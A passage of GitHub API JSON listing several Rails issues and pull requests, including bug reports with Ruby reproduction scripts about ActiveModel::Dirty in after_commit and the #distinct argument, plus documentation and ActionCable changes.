        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nExpand some documentation and examples for querying across multiple records that implement delegated types.\r\n\r\n### Detail\r\n\r\nThis Pull Request changes documentation in ActiveRecord Delegated Type.\r\n\r\n### Additional information\r\n\r\nN/A\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51047/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51047/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51046",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51046/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51046/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51046/events",
        "html_url": "https://github.com/rails/rails/issues/51046",
        "id": 2129104560,
        "node_id": "I_kwDNIULOfueOsA",
        "number": 51046,
        "title": "ActiveModel::Dirty is broken in after_commit",
        "user": {
            "login": "kshnurov",
            "id": 498185,
            "node_id": "MDQ6VXNlcjQ5ODE4NQ==",
            "avatar_url": "https://avatars.githubusercontent.com/u/498185?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/kshnurov",
            "html_url": "https://github.com/kshnurov",
            "followers_url": "https://api.github.com/users/kshnurov/followers",
            "following_url": "https://api.github.com/users/kshnurov/following{/other_user}",
            "gists_url": "https://api.github.com/users/kshnurov/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/kshnurov/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/kshnurov/subscriptions",
            "organizations_url": "https://api.github.com/users/kshnurov/orgs",
            "repos_url": "https://api.github.com/users/kshnurov/repos",
            "events_url": "https://api.github.com/users/kshnurov/events{/privacy}",
            "received_events_url": "https://api.github.com/users/kshnurov/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-11T18:12:40Z",
        "updated_at": "2024-02-14T15:58:26Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "#45280 broke the [expected and documented](https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md?plain=1#L598-L608) behaviour by introducing a breaking change in Rails 7.1.\r\nIt leads to hard-to-find silent bugs and should be reverted, there's no workaround except disabling it completely with `config.active_record.run_commit_callbacks_on_first_saved_instances_in_transaction = true`.\r\nThe problem it was trying to solve is well-documented and easily dealt with `reload`.\r\n\r\n### Steps to reproduce\r\nOversimplified example:\r\n```ruby\r\n# frozen_string_literal: true\r\n\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n\r\n  git_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\r\n\r\n  gem \"rails\"\r\n  # If you want to test against edge Rails replace the previous line with this:\r\n  # gem \"rails\", github: \"rails/rails\", branch: \"main\"\r\n\r\n  gem \"sqlite3\"\r\nend\r\n\r\nrequire \"active_record\"\r\nrequire \"minitest/autorun\"\r\nrequire \"logger\"\r\n\r\n# This connection will do for database-independent bug reports.\r\nActiveRecord::Base.establish_connection(adapter: \"sqlite3\", database: \":memory:\")\r\nActiveRecord::Base.logger = Logger.new(STDOUT)\r\n\r\nActiveRecord::Schema.define do\r\n  create_table :posts, force: true do |t|\r\n    t.integer :comments_count, null: false, default: 0\r\n  end\r\n\r\n  create_table :comments, force: true do |t|\r\n    t.boolean :hidden, null: false, default: false\r\n    t.integer :post_id\r\n  end\r\nend\r\n\r\nclass Post < ActiveRecord::Base\r\n  has_many :comments\r\n\r\n  def update_comments_count!\r\n    self.update!(comments_count: comments.size)\r\n  end\r\nend\r\n\r\nclass Comment < ActiveRecord::Base\r\n  belongs_to :post\r\n  after_commit :update_posts\r\n\r\n  def update_posts\r\n    if saved_change_to_post_id?\r\n      post.update_comments_count!\r\n    end\r\n  end\r\nend\r\n\r\nclass BugTest < Minitest::Test\r\n  def test_association_stuff\r\n    post_1 = Post.create!\r\n    post_1.comments.create!\r\n\r\n    assert_equal 1, post_1.comments_count\r\n\r\n    post_2 = Post.create!\r\n    comment = post_2.comments.build\r\n    Post.transaction do\r\n      comment.save!\r\n      comment.update!(hidden: true)\r\n    end\r\n    assert_equal 1, post_1.comments_count\r\n    assert_equal 1, post_2.comments_count\r\n  end\r\nend\r\n```\r\n\r\n### Expected behavior\r\n`saved_change_to_post_id? == true`\r\n\r\n### Actual behavior\r\n`saved_change_to_post_id? == false`\r\n\r\n### System configuration\r\n**Rails version**: 7.1+\r\n**Ruby version**: 3.2.3",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51046/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51046/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51045",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51045/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51045/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51045/events",
        "html_url": "https://github.com/rails/rails/pull/51045",
        "id": 2128777646,
        "node_id": "PR_kwDNIULOZpExYQ",
        "number": 51045,
        "title": "[Fix #51044] Deprecate providing a non-boolean argument to `#distinct`",
        "user": {
            "login": "joshuay03",
            "id": 54629302,
            "node_id": "MDQ6VXNlcjU0NjI5MzAy",
            "avatar_url": "https://avatars.githubusercontent.com/u/54629302?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/joshuay03",
            "html_url": "https://github.com/joshuay03",
            "followers_url": "https://api.github.com/users/joshuay03/followers",
            "following_url": "https://api.github.com/users/joshuay03/following{/other_user}",
            "gists_url": "https://api.github.com/users/joshuay03/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/joshuay03/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/joshuay03/subscriptions",
            "organizations_url": "https://api.github.com/users/joshuay03/orgs",
            "repos_url": "https://api.github.com/users/joshuay03/repos",
            "events_url": "https://api.github.com/users/joshuay03/events{/privacy}",
            "received_events_url": "https://api.github.com/users/joshuay03/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-02-11T00:50:48Z",
        "updated_at": "2024-02-13T10:08:18Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51045",
            "html_url": "https://github.com/rails/rails/pull/51045",
            "diff_url": "https://github.com/rails/rails/pull/51045.diff",
            "patch_url": "https://github.com/rails/rails/pull/51045.patch",
            "merged_at": null
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nFixes #51044\r\n\r\n### Detail\r\n\r\nUpdates the documented `ActiveRecord::QueryMethods#distinct` and undocumented `ActiveRecord::QueryMethods#distinct!` methods to ~raise an `ArgumentError`~ log a deprecation warning if given a non-boolean argument.\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\nNone.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51045/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51045/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51044",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51044/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51044/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51044/events",
        "html_url": "https://github.com/rails/rails/issues/51044",
        "id": 2128776609,
        "node_id": "I_kwDNIULOfuKNoQ",
        "number": 51044,
        "title": "Relation `#distinct` doesn't raise an error for invalid arguments",
        "user": {
            "login": "joshuay03",
            "id": 54629302,
            "node_id": "MDQ6VXNlcjU0NjI5MzAy",
            "avatar_url": "https://avatars.githubusercontent.com/u/54629302?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/joshuay03",
            "html_url": "https://github.com/joshuay03",
            "followers_url": "https://api.github.com/users/joshuay03/followers",
            "following_url": "https://api.github.com/users/joshuay03/following{/other_user}",
            "gists_url": "https://api.github.com/users/joshuay03/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/joshuay03/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/joshuay03/subscriptions",
            "organizations_url": "https://api.github.com/users/joshuay03/orgs",
            "repos_url": "https://api.github.com/users/joshuay03/repos",
            "events_url": "https://api.github.com/users/joshuay03/events{/privacy}",
            "received_events_url": "https://api.github.com/users/joshuay03/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 41328116,
                "node_id": "MDU6TGFiZWw0MTMyODExNg==",
                "url": "https://api.github.com/repos/rails/rails/labels/attached%20PR",
                "name": "attached PR",
                "color": "006b75",
                "default": false,
                "description": null
            },
            {
                "id": 126910270,
                "node_id": "MDU6TGFiZWwxMjY5MTAyNzA=",
                "url": "https://api.github.com/repos/rails/rails/labels/With%20reproduction%20steps",
                "name": "With reproduction steps",
                "color": "009800",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-02-11T00:46:47Z",
        "updated_at": "2024-02-12T01:01:36Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n<!-- (Guidelines for creating a bug report are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#creating-a-bug-report)) -->\r\n\r\n[`#distinct`](https://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-distinct) only takes in a single `value` argument that defaults to `true`. This determines whether or not the distinct clause is applied to the relation. However, the argument isn't validated and is always treated as truthy or falsey (e.g. [in this condition](https://github.com/rails/rails/blob/0f9aaa5ca9b8421ebf42b3d7720632d4c1cae5fc/activerecord/lib/active_record/relation.rb#L474)). This means that a non-boolean argument can be passed in with certain expectations (e.g. a column that's not the primary key expecting the query to result in a `DISTINCT ON`), but the `DISTINCT` clause will always only either apply or not apply on the base table's primary key.\r\n\r\nI've had to explain that passing (a truthy) argument this way doesn't change the outcome of the clause to junior engineers a couple of times, so I feel like this is something that should be validated. The script below is a good example of how one could misunderstand this API.\r\n\r\n<!-- Paste your executable test case created from one of the scripts found [here](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#create-an-executable-test-case) below: -->\r\n```ruby\r\n# frozen_string_literal: true\r\n\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n\r\n  git_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\r\n\r\n  gem \"rails\", github: \"rails/rails\", branch: \"main\"\r\n\r\n  gem \"sqlite3\"\r\nend\r\n\r\nrequire \"active_record\"\r\nrequire \"minitest/autorun\"\r\nrequire \"logger\"\r\n\r\n# This connection will do for database-independent bug reports.\r\nActiveRecord::Base.establish_connection(adapter: \"sqlite3\", database: \":memory:\")\r\nActiveRecord::Base.logger = Logger.new(STDOUT)\r\n\r\nActiveRecord::Schema.define do\r\n  create_table :authors, force: true do |t|\r\n  end\r\n\r\n  create_table :posts, force: true do |t|\r\n    t.integer :author_id\r\n  end\r\nend\r\n\r\nclass Author < ActiveRecord::Base\r\n  has_many :posts\r\nend\r\n\r\nclass Post < ActiveRecord::Base\r\n  belongs_to :author\r\nend\r\n\r\nclass BugTest < Minitest::Test\r\n  def test_distinct_with_non_boolean_arguments\r\n    author = Author.create!\r\n    post_1 = Post.create!(author: author)\r\n    post_2 = Post.create!(author: author)\r\n\r\n    # Passes as expected\r\n    assert_equal 1, Post.where(id: [post_1.id, post_2.id]).select(\"DISTINCT author_id\").count\r\n\r\n    # Fails with 'expected 1, got 2' which is correct, but it should raise an ArgumentError\r\n    # since the `#distinct` argument is invalid and the DISTINCT clause is on id and not author_id\r\n    assert_equal 1, Post.where(id: [post_1.id, post_2.id]).distinct(:author_id).count\r\n  end\r\nend\r\n\r\n```\r\n\r\n### Expected behavior\r\n<!-- Tell us what should happen -->\r\n\r\nAn `ArgumentError` should be raised\r\n\r\n### Actual behavior\r\n<!-- Tell us what happens instead -->\r\n\r\nNo error is raised, argument is treated the same as `true` if truthy, and `false` if falsey\r\n\r\n### System configuration\r\n**Rails version**: 7.1.3 (latest), main\r\n\r\n**Ruby version**: 3.3.0",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51044/reactions",
            "total_count": 2,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 2,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51044/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51043",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51043/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51043/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51043/events",
        "html_url": "https://github.com/rails/rails/pull/51043",
        "id": 2128635842,
        "node_id": "PR_kwDNIULOZo9zLw",
        "number": 51043,
        "title": "ActionCable: allow to pass websocket.close args",
        "user": {
            "login": "jasl",
            "id": 1024162,
            "node_id": "MDQ6VXNlcjEwMjQxNjI=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1024162?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/jasl",
            "html_url": "https://github.com/jasl",
            "followers_url": "https://api.github.com/users/jasl/followers",
            "following_url": "https://api.github.com/users/jasl/following{/other_user}",
            "gists_url": "https://api.github.com/users/jasl/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/jasl/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/jasl/subscriptions",
            "organizations_url": "https://api.github.com/users/jasl/orgs",
            "repos_url": "https://api.github.com/users/jasl/repos",
            "events_url": "https://api.github.com/users/jasl/events{/privacy}",
            "received_events_url": "https://api.github.com/users/jasl/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 300028327,
                "node_id": "MDU6TGFiZWwzMDAwMjgzMjc=",
                "url": "https://api.github.com/repos/rails/rails/labels/actioncable",
                "name": "actioncable",
                "color": "bfdadc",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 7,
        "created_at": "2024-02-10T18:19:37Z",
        "updated_at": "2024-02-16T22:23:15Z",
        "closed_at": "2024-02-16T22:13:46Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51043",
            "html_url": "https://github.com/rails/rails/pull/51043",
            "diff_url": "https://github.com/rails/rails/pull/51043.diff",
            "patch_url": "https://github.com/rails/rails/pull/51043.patch",
            "merged_at": "2024-02-16T22:13:46Z"
        },
        "body": "This PR allows you to set `code` and `reason` when closing a WebSocket connection.\r\nIt's very useful when hacking ActionCable.\r\n\r\nIn addition, I small refactor the file to avoid potential nil error, I can remove this change.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51043/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51043/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51042",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51042/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51042/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51042/events",
        "html_url": "https://github.com/rails/rails/pull/51042",
        "id": 2128604215,
        "node_id": "PR_kwDNIULOZo8SpQ",
        "number": 51042,
        "title": "docs: Outdated CORS initializer [ci-skip]",
        "user": {
            "login": "lsglucas",
            "id": 61513630,
            "node_id": "MDQ6VXNlcjYxNTEzNjMw",
            "avatar_url": "https://avatars.githubusercontent.com/u/61513630?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/lsglucas",
            "html_url": "https://github.com/lsglucas",
            "followers_url": "https://api.github.com/users/lsglucas/followers",
            "following_url": "https://api.github.com/users/lsglucas/following{/other_user}",
            "gists_url": "https://api.github.com/users/lsglucas/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/lsglucas/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/lsglucas/subscriptions",
            "organizations_url": "https://api.github.com/users/lsglucas/orgs",
            "repos_url": "https://api.github.com/users/lsglucas/repos",
            "events_url": "https://api.github.com/users/lsglucas/events{/privacy}",
            "received_events_url": "https://api.github.com/users/lsglucas/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-10T16:36:27Z",
        "updated_at": "2024-02-19T01:33:06Z",
        "closed_at": "2024-02-18T17:10:43Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51042",
            "html_url": "https://github.com/rails/rails/pull/51042",
            "diff_url": "https://github.com/rails/rails/pull/51042.diff",
            "patch_url": "https://github.com/rails/rails/pull/51042.patch",
            "merged_at": "2024-02-18T17:10:43Z"
        },
        "body": "### Motivation / Background\r\n\r\nThe current security guide contains outdated information about the CORS initializer.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51042/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51042/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51041",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51041/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51041/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51041/events",
        "html_url": "https://github.com/rails/rails/issues/51041",
        "id": 2128421277,
        "node_id": "I_kwDNIULOft0hnQ",
        "number": 51041,
        "title": "no implicit conversion of String into Integer (TypeError) @env[name] ",
        "user": {
            "login": "luizkowalski",
            "id": 112706,
            "node_id": "MDQ6VXNlcjExMjcwNg==",
            "avatar_url": "https://avatars.githubusercontent.com/u/112706?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/luizkowalski",
            "html_url": "https://github.com/luizkowalski",
            "followers_url": "https://api.github.com/users/luizkowalski/followers",
            "following_url": "https://api.github.com/users/luizkowalski/following{/other_user}",
            "gists_url": "https://api.github.com/users/luizkowalski/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/luizkowalski/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/luizkowalski/subscriptions",
            "organizations_url": "https://api.github.com/users/luizkowalski/orgs",
            "repos_url": "https://api.github.com/users/luizkowalski/repos",
            "events_url": "https://api.github.com/users/luizkowalski/events{/privacy}",
            "received_events_url": "https://api.github.com/users/luizkowalski/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 131864,
                "node_id": "MDU6TGFiZWwxMzE4NjQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/third%20party%20issue",
                "name": "third party issue",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-02-10T13:17:38Z",
        "updated_at": "2024-02-10T13:34:12Z",
        "closed_at": "2024-02-10T13:34:11Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n\r\nI have a Rails app where the version is pointed to the `main` branch and just this morning, I noticed the following error popping up on my Sentry:\r\n\r\n```ruby\r\nTypeError: no implicit conversion of String into Integer (TypeError)\r\n\r\n        @env[name]\r\n             ^^^^\r\n  from rack (3.0.9) lib/rack/request.rb:101:in `[]'\r\n  from rack (3.0.9) lib/rack/request.rb:101:in `get_header'\r\n  from rails (1a92af2b5140) actionpack/lib/action_dispatch/middleware/show_exceptions.rb:35:in `rescue in call'\r\n  from rails (1a92af2b5140) actionpack/lib/action_dispatch/middleware/show_exceptions.rb:31:in `call'\r\n  from lograge (0.14.0) lib/lograge/rails_ext/rack/logger.rb:18:in `call_app'\r\n  from rails (1a92af2b5140) railties/lib/rails/rack/logger.rb:28:in `call'\r\n  from rails (1a92af2b5140) actionpack/lib/action_dispatch/middleware/remote_ip.rb:96:in `call'\r\n  from request_store (1.6.0) lib/request_store/middleware.rb:19:in `call'\r\n  from rails (1a92af2b5140) actionpack/lib/action_dispatch/middleware/request_id.rb:33:in `call'\r\n  from rack (3.0.9) lib/rack/method_override.rb:28:in `call'\r\n  from rack (3.0.9) lib/rack/runtime.rb:24:in `call'\r\n  from rails (1a92af2b5140) activesupport/lib/active_support/cache/strategy/local_cache_middleware.rb:29:in `call'\r\n  from rails (1a92af2b5140) actionpack/lib/action_dispatch/middleware/executor.rb:16:in `call'\r\n  from rails (1a92af2b5140) actionpack/lib/action_dispatch/middleware/static.rb:27:in `call'\r\n  from rack (3.0.9) lib/rack/sendfile.rb:114:in `call'\r\n  from rails (1a92af2b5140) actionpack/lib/action_dispatch/middleware/assume_ssl.rb:24:in `call'\r\n  from rails (1a92af2b5140) railties/lib/rails/engine.rb:536:in `call'\r\n  from prometheus-client-mmap-1.1.1-x86_64 (linux) lib/prometheus/client/rack/exporter.rb:29:in `call'\r\n  from rack (3.0.9) lib/rack/deflater.rb:47:in `call'\r\n  from puma (6.4.2) lib/puma/configuration.rb:272:in `call'\r\n  from puma (6.4.2) lib/puma/request.rb:100:in `block in handle_request'\r\n  from puma (6.4.2) lib/puma/thread_pool.rb:378:in `with_force_shutdown'\r\n  from puma (6.4.2) lib/puma/request.rb:99:in `handle_request'\r\n  from puma (6.4.2) lib/puma/server.rb:464:in `process_client'\r\n  from puma (6.4.2) lib/puma/server.rb:245:in `block in run'\r\n  from puma (6.4.2) lib/puma/thread_pool.rb:155:in `block in spawn_thread'\r\n\r\n```\r\n\r\nI reverted a couple of versions and tracked it down to this commit: https://github.com/rails/rails/commit/cd053bcedcec0f130a74a93abdfae3ca8dcd93c6\r\n\r\nBefore this commit, it works, with this commit and after, it triggers the error above\r\n\r\n### System configuration\r\n**Rails version**: latest from `main`\r\n\r\n**Ruby version**: `3.3.0`\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51041/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51041/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51040",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51040/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51040/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51040/events",
        "html_url": "https://github.com/rails/rails/pull/51040",
        "id": 2128412825,
        "node_id": "PR_kwDNIULOZoxaGA",
        "number": 51040,
        "title": "remove unknown rollup input option breakOnWarning",
        "user": {
            "login": "hendrixfan",
            "id": 19203626,
            "node_id": "MDQ6VXNlcjE5MjAzNjI2",
            "avatar_url": "https://avatars.githubusercontent.com/u/19203626?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/hendrixfan",
            "html_url": "https://github.com/hendrixfan",
            "followers_url": "https://api.github.com/users/hendrixfan/followers",
